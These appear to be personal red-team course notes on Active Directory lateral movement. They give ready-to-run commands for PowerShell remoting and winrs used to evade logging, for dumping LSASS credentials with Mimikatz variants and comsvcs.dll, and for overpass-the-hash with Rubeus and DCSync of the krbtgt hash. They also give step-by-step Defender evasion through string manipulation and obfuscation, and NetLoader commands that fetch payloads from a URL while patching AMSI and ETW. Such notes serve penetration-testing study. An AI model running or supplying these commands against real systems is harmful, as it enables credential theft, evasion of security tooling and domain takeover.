# **Lateral Movement - PowerShell Remoting**

- Think of **powershell remoting** (PSRemoting) as psexec on steroids but much more silent and super fast!
- PSRemoting uses Windows Remoting Management (WinRM) which is Microsoft's implementation of WS-Management.
- Enabled by default on Server 2012 onwards with a firewall exception.
- Uses WinRM and listens by default on 5985 (HTTP) and 5986 (HTTPS)
- It is the recommended way to manage windows Cores servers.
- You may need to enable remoting (Enable-PSRemoting) on a Desktop Windows machine, Admin privileges are required to do that. 
- The remoting process runs as a high integrity process. That is, you get an elevated shell.


## **There are two ways of remoting to a machine**

- [ ]  **One-to-One**
	- PSSession
		- Interactive
		- Runs in a new process (wsmprovhost)
		- Is Stateful


> **Note :** When you PSRemote to a machine  it is not a powershell process that runs on the machine, it is a process called the **wsmprovhost**  that spins up on the target machine


- Useful cmdlets

```powershell
$ New-PSSession
$ Enter-PSSession
```


**_Example_**

As shown below we have administrative access on the current `dcorp-adminsrv` machine, this is how we can access the machine where we have administrative access using **Power Shell Remoting** 


![](https://i.imgur.com/ERPf5mM.png)




- Then run

```powershell
$ exit
$ $adminsrv = NewPSSession dcorp-adminsrv
$ $adminsrv
```


**_Example_**


![](https://i.imgur.com/72tbr19.png)


> **Pros and Cons :** If we have permissions to move laterally from our machine to like 10,000 machines the **One-to-one** might not work, because we have to do it manually but with the **One-to-Many**, we can actually move easily

- [ ] **One-to-Many**
	- Also known as Fan-out remoting.
	- Non-interactive
	- Executes commands parallely
	- Useful cmdlets

```powershell
$ Invoke-Command
```


- Run commands and scripts on
	- multiple remote computers,
	- in disconnected sessions (v3)
	- as background job and more.
- The best thing in powershell for passing the hashes, using credentials and executing commands on multiple remote computers.
- Use `-Credential` parameter to pass **username/password**.



- Use below to execute commands or scriptblocks (This will execute the `Get-Process` command on each machine):

```powershell
$ Invoke-Command -Scriptblock {Get-Process} -ComputerName (Get-Content <list_of_servers>)
```



- Use below to execute scripts from files

```powershell
$ Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)
```


- Use below to execute locally loaded function on the remote machines:


```powershell
$ Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>)
```

- In this case, we are passing Arguments. Keep in mind that only positional arguments could be passed this way:

```powershell
$ Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>) -ArgumentList
```


**_Example Usage_** -:


Run the `whoami` and `hostname` command on the `$adminsrv` server


![](https://i.imgur.com/SniQryf.png)


- Use below to execute "Stateful" commands using Invoke-Command:

```powershell
$ $Sess = New-PSSession -Computername Server1 Invoke-Command -Session $Sess -ScriptBlock {$Proc = Get-Process} Invoke-Command -Session $Sess -ScriptBlock {$Proc.Name}
```



## **PowerShell Remoting - Tradecraft**


- PowerShell remoting supports the system-wide transcripts and deep script block logging.
- We can use winrs in place of PSRemoting to evade the logging (and still reap the benefit of 5985 allowed between hosts):

```powershell
winrs -remote:server1 -u:server1\administrator -
p:Pass@1234 hostname
```

- We can also use winrm.vbs and COM objects of WSMan object - https://github.com/bohops/WSMan-WinRM



# **Lateral Movement - Invoke-Mimikatz**


- Mimikatz can be used to dump credentials, tickets, and many more interesting attacks!
- Invoke-Mimikatz, is a PowerShell port of Mimikatz. Using the code from `ReflectivePEInjection`, mimikatz is loaded reflectively into the memory. All the functions of mimikatz could be used from this script.
- The script needs administrative privileges for dumping credentials from local machine. Many attacks need specific privileges which are covered while discussing that attack.



## **Lateral Movement - Extracting Credentials from LSASS**

All needs **Local Admin Access**

- Dump credentials on a local machine using Mimikatz

```powershell
$ Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
```


- Using SafetyKatz (Minidump of lsass and PELoader to run Mimikatz)

```powershell
$ SafetyKatz.exe "sekurlsa::ekeys"
```


- Dump credentials Using SharpKatz (C# port of some of Mimikatz functionality).

```powershell
$ SharpKatz.exe --Command ekeys
```



- Dump credentials using Dumpert (Direct System Calls and API unhooking)


```powershell
$ rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump
```


- Using pypykatz (Mimikatz functionality in Python)

```powershell
$ pypykatz.exe live lsa
```


- Using comsvcs.dll (Very aggressively detected)

```powershell
$ tasklist /FI "IMAGENAME eq lsass.exe" rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <lsass process ID> C:\Users\Public\lsass.dmp full
```



- From a Linux attacking machine using `impacket`.
- From a Linux attacking machine using `Physmem2profit`


> **Note :** Anything that interact with LSASS has higher chances of detection, so before trying to extract credentials from LSASS we can try to lookup other revenues e.g powershell console history, Local SAM hives, Credential Notes etc.


## **Lateral Movement - OverPass-The-Hash**


- Over Pass the hash (OPTH) generate tokens from hashes or keys. Needs elevation (Run as administrator)

- Using `Mimikatz`

```powershell
$ Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:us.techcorp.local /aes256:<aes256key> /run:powershell.exe"'
```

- Using `SafetyKatz`

```powershell
$ SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:us.techcorp.local /aes256:<aes256keys> /run:cmd.exe" "exit"
```


- The above commands starts a PowerShell session with a logon type 9 (same as runas /netonly).

## **Lateral Movement - OverPass-The-Hash**

- Over Pass the hash (OPTH) generate tokens from hashes or keys.

- Below doesn't need elevation (Will overwrite current TGT)


```powershell
$ Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt
```


- Below command needs elevation.


```powershell
$ Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```



## **Lateral Movement - DCSync**


- To extract credentials from the DC without code execution on it, we can use DCSync.
- To use the DCSync feature for getting krbtgt hash execute the below command with DA privileges for us domain:


```powershell
$ Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"' SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
```

- By default, Domain Admins privileges are required to run DCSync.



# **Offensive .NET - Introduction**



- Currently, .NET lacks some of the security features implemented in System.Management.Automation.dll.
- Because of this, many Red teams have included .NET in their tradecraft.
- There are many open source Offensive .NET tools and we will use the ones that fit our attack methodology.
- When using .NET (or any other compiled language) there are some challenges
	- Detection by countermeasures like AV, EDR etc.
	- Delivery of the payload (Recall Powershell's sweet download-execute cradles)
	- Detection by logging like process creation logging, command line logging etc
- We will address the AV detection and delivery of the payload as and when required.
- The course instructor says we are on our own when the binaries that they share start getting detected by windows Defender :), They don't know i do pentest 🤫 (Forever loud!!!)
- We will focus mostly on bypass of signature based detection by windows defender.
- For that, we can use techniques like obfuscation, String Manipulation etc
- We can use `DefenderCheck` (https://github.com/matterpreter/DefenderCheck) to identify code and strings from a binary that windows defender may flag.
- This helps us in deciding on modifying the source code and minimal obfuscation.

## **Offensive .NET - Tradecraft - AV bypass - DefenderCheck**


- Let's check SharpKatz.exe for signatures using DefenderCheck


```powershell
$ DefenderCheck.exe <Path to Sharpkatz binary>
```



**_Example_** -:


![](https://i.imgur.com/TkcfMJY.png)


## **Using DefenderCheck Output to Manipulate strings**


- Generally it is a practice of trial and error, we keep replacing strings gotten form `DefenderCheck` output till AV doesn't detect it 🥏, here is an example bypass 


![](https://i.imgur.com/MegfEKj.png)


## **Offensive .NET - Tradecraft - AV bypass - String Manipulation**


- [ ] For safetyKatz, we used the following steps
	- Download latest version of Mimikatz and Out-CompressedDll.ps1
	- Run the Out-CompressedDll.ps1 PowerShell script on Mimikatz binary and save the output to a file

```powershell
$ Out-CompressedDll <Path to mimikatz.exe> > outputfilename.txt
```

- Copy the value of the variable "`$EncodedCompressedFile`" from the output file (`outputfilename.txt`) above and replace the value of "`compressedMimikatzString`" variable in the "`Constants.cs`" file of **SafetyKatz**.


![](https://i.imgur.com/1EinKFj.png)


- Copy the byte size from the output file (`outputfilename.txt`) and replace it in "`Program.cs`" file of **SafetyKatz** on the line 111 & 116.
- Build and recheck the binary with `DefenderCheck`.


![](https://i.imgur.com/Yr4pM6x.png)




## **Offensive .NET - Tradecraft - AV bypass - BetterSafetyKatz**

- [ ] For BetterSafetyKatz, we used the following steps
	- Download the latest release of "mimikatz_trunk.zip" file.
	- Convert the file to **Base64** value

![](https://i.imgur.com/iLqskcG.png)


- Modify the "`Program.cs`" file.
	- Added a new variable that contains the base64 value of "mimikatz_trunk.zip" file.
	- Comment the code that downloads or accepts the mimikatz file as an argument.
	- Convert the base64 string to bytes and pass it to "zipStream" variable.


![](https://i.imgur.com/MwCMxQN.png)



## **Offensive .NET - Tradecraft - AV bypass - Obfuscation**



- For Rubeus.exe, we used ConfuserEx (https://github.com/mkaring/ConfuserEx) to obfuscate the binary

![](https://i.imgur.com/mdkEh2t.png)


**Usage** -:


- Launch ConfuserEx
- In Project tab select the Base Directory where the binary file is located.
- In Project tab Select the Binary File that we want to obfuscate.
- In Settings tab add the rules.
- In Settings tab edit the rule and select the preset as `Normal`.
- In Protect tab click on the protect button.
- We will find the new obfuscated binary in the Confused folder under the Base Directory.


![](https://i.imgur.com/FwiuSFo.png)


## **Offensive .NET - Tradecraft - Payload Delivery**


- We can use NetLoader (https://github.com/Flangvik/NetLoader) to deliver our binary payloads.
- It can be used to load binary from filepath or URL and patch AMSI & ETW while executing.


```powershell
$ C:\Users\Public\Loader.exe -path http://192.168.100.X/SafetyKatz.exe
```


- We also have AssemblyLoad.exe that can be used to load the Netloader in-memory from a URL which then loads a binary from a filepath or URL.


```powershell
$ C:\Users\Public\AssemblyLoad.exe http://192.168.100.X/Loader.exe -path http://192.168.100.X/SafetyKatz.exe
```


# **Learning Objective 7**


- Identify a machine in the target domain where a Domain Admin session is available.
- Compromise the machine and escalate privileges to Domain Admin
	- Using access to `dcorp-ci`
	- Using derivative local admin


## **Solution**

**_Coming Soon_**


